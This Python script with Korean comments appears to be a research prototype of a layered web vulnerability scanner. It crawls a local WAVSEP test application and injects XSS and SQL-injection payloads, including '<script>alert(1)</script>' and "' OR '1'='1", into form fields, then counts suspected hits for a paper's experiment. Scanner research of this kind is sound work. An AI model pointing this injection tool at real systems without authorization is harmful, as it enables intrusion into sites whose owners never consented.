import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import urllib3
import hashlib
import time

# 경고 메시지 무시
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# [실험 모드 설정] - 논문 Table 1 데이터 측정용
# ==========================================
ENABLE_LAYER_A = True  # 필수 (페이지 수집)
ENABLE_LAYER_B = True  # 선택 (중복 제거 & 우선순위 큐)
ENABLE_LAYER_C = True  # 선택 (공격 수행)
# ==========================================

# [사용자 설정 - 수정됨]
# 1. 스캔 범위 기준 주소 (반드시 끝에 슬래시 '/' 붙일 것!)
base_url = "http://localhost:8080/wavsep/"

# 2. 쿠키 설정 (WAVSEP은 기본적으로 비워도 됨, 필요시 채우기)
cookie_value = {} 

# 3. 페이로드 파일 이름 (같은 폴더에 있어야 함)
xss_file = "payloads.txt"
sql_file = "sql_payloads.txt"

# 파일 로드 함수
def load_payloads(filename):
    try:
        with open(filename, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] 경고: {filename} 파일을 찾을 수 없습니다. 기본 페이로드만 사용합니다.")
        return ["<script>alert(1)</script>", "' OR '1'='1"]

xss_payloads = load_payloads(xss_file)
sql_payloads = load_payloads(sql_file)
all_payloads = xss_payloads + sql_payloads

# 세션 설정
sess = requests.Session()
sess.cookies.update(cookie_value)
sess.headers.update({'User-Agent': 'Mozilla/5.0 (PLVD-Test/1.0)'})

# DOM 해시 함수
def get_dom_fingerprint(soup):
    tags = "".join([tag.name for tag in soup.find_all(True)])
    return hashlib.md5(tags.encode()).hexdigest()

# 메인 로직
visited_urls = set()
visited_doms = set()

# [중요 수정] 시작점을 'Active 취약점 목록' 페이지로 바로 지정 (0개 발견 방지)
# 이렇게 하면 메인 페이지를 거치지 않고 바로 공격 대상 목록부터 훑습니다.
start_url = urljoin(base_url, "active/index-active.jsp")
queue = [start_url]

start_time = time.time()
vuln_count = 0
request_count = 0 

print(f"[*] 실험 시작 | 모드: A={ENABLE_LAYER_A}, B={ENABLE_LAYER_B}, C={ENABLE_LAYER_C}")
print(f"[*] 타겟: {base_url} (시작점: {start_url})")

try:
    while queue:
        current_url = queue.pop(0)
        
        if current_url in visited_urls: continue
        visited_urls.add(current_url)

        try:
            # [Layer A] 페이지 수집 (Hybrid Data Acquisition)
            if not ENABLE_LAYER_A: break 
            
            res = sess.get(current_url, timeout=5)
            request_count += 1 
            soup = BeautifulSoup(res.text, "html.parser")
            
            # 로그인 풀림 체크 (WAVSEP에서는 크게 상관없으나 유지)
            if soup.title and "login" in soup.title.string.lower():
                print("[!] 로그인 세션 만료 가능성 있음.")

            print(f"[탐색] {current_url}")

            # [Layer B] 필터링 및 우선순위 (Pre-processing)
            is_duplicate = False
            if ENABLE_LAYER_B:
                dom_hash = get_dom_fingerprint(soup)
                if dom_hash in visited_doms:
                    # 완전히 똑같은 구조의 페이지는 건너뜀
                    is_duplicate = True
                else:
                    visited_doms.add(dom_hash)
            
            # (주의) 너무 빡빡하면 주석 처리할 것
            if is_duplicate: 
                # print("   [Skip] 중복 페이지 생략")
                continue 

            # 링크 수집
            for a_tag in soup.find_all("a", href=True):
                full_link = urljoin(current_url, a_tag["href"])
                
                # 로그아웃 등 제외
                if "logout" in full_link.lower(): continue
                
                # [수정됨] base_url(localhost:8080/wavsep/) 안에 있는 링크만 수집
                if base_url in full_link and full_link not in visited_urls and full_link not in queue:
                    # 중요 페이지 우선순위 스케줄링
                    if ENABLE_LAYER_B and ("?" in full_link or "php" in full_link or "jsp" in full_link):
                        queue.insert(0, full_link)
                    else:
                        queue.append(full_link)

            # [Layer C] 공격 수행 (Detection & Analysis)
            if ENABLE_LAYER_C:
                forms = soup.find_all("form")
                for form in forms:
                    # form action이 비어있으면 현재 URL로 설정
                    action = urljoin(current_url, form.attrs.get("action", ""))
                    method = form.attrs.get("method", "get").lower()
                    
                    base_data = {}
                    # input, textarea, select 등 모든 입력 태그 수집
                    for tag in form.find_all(["input", "textarea", "select"]):
                        name = tag.attrs.get("name")
                        value = tag.attrs.get("value", "")
                        if name:
                            base_data[name] = value

                    # 공격 대상 입력창 식별 (submit, button, hidden 제외하고 공격)
                    target_inputs = [tag.attrs.get("name") for tag in form.find_all(["input", "textarea"]) 
                                   if tag.attrs.get("name") and tag.attrs.get("type") not in ["submit", "button", "hidden"]]
                    
                    if not target_inputs: continue
                    
                    # 식별된 입력창에 페이로드 주입
                    for input_name in target_inputs:
                        for code in all_payloads:
                            attack_data = base_data.copy()
                            attack_data[input_name] = code
                            
                            try:
                                # 요청 전송
                                if method == "post":
                                    req = sess.post(action, data=attack_data, timeout=5)
                                else:
                                    req = sess.get(action, params=attack_data)
                                request_count += 1 
                                
                                is_vuln = False
                                
                                # 1. 에러 기반 (Error-based SQLi)
                                if "mysql" in req.text.lower() or "syntax error" in req.text.lower() or "sql" in req.text.lower():
                                    is_vuln = True
                                # 2. 반사 기반 (Reflected XSS)
                                elif code in req.text:
                                    is_vuln = True
                                # 3. 시간 기반 (Time-based Blind SQLi)
                                elif "SLEEP" in code.upper() or "BENCHMARK" in code.upper():
                                    if req.elapsed.total_seconds() >= 3:
                                        print(f"      >>> [Time-Based] {req.elapsed.total_seconds():.2f}초 지연 감지")
                                        is_vuln = True

                                if is_vuln:
                                    print(f"      >>> [취약점 발견!] {input_name} (URL: {action})")
                                    vuln_count += 1
                                    # 하나 발견하면 다음 입력창으로 넘어갈지, 계속할지 결정 (여기선 계속)
                                    
                            except Exception as e:
                                # 타임아웃 등 에러 발생 시
                                pass 

        except Exception as e:
            print(f"[에러] {e}")

except KeyboardInterrupt:
    print("\n[중단] 사용자 중단")

# 결과 출력
duration = time.time() - start_time
print("\n" + "="*30)
print(f" [실험 결과 Report]")
print(f" 설정: A={ENABLE_LAYER_A}, B={ENABLE_LAYER_B}, C={ENABLE_LAYER_C}")
print(f" 1. 총 소요 시간: {duration:.2f}초")
print(f" 2. 총 HTTP 요청 수: {request_count}회")
print(f" 3. 발견된 취약점: {vuln_count}개")
print("="*30)